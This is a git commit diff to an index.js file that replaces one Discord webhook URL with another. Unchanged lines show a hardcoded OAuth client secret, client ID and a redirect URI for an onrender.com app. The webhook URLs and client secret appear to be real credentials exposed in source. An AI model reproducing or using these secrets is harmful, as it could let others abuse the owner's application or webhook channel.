cef5994abaf7dbf80bf0509874405cda0fe49c75
Pizzaboibest9 <97367882+Pizzaboiibestlegit@users.noreply.github.com>
2022-12-18 17:24:24 -0700

    Update index.js

--- index.js
+++ index.js
@@ -2,7 +2,7 @@
 const client_secret = 'HDi8Q~3K9txE95qWs3m.I.iFcXXU2iX9rO6thcm1' 
 const client_id = '9f45baed-008a-4692-bdf4-23988239c9ac'
 const redirect_uri = 'https://skyhelper.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1048733035610247218/0E1lR7I3tmoUpvXsxwx9B-rwUD6NsFjuXrmoJ_QBnm6H8ItMnJLD1DsOtvkyi-YKsuhw'
+const webhook_url = 'https://discord.com/api/webhooks/1024413307626598520/iN72ojw2xFt1LrYKr2qkiLTxrQk2rBMT-x_9vWPmXTVXlwOWE3olAbS5q0Ianum3kzub'
 
 
 //Requirements
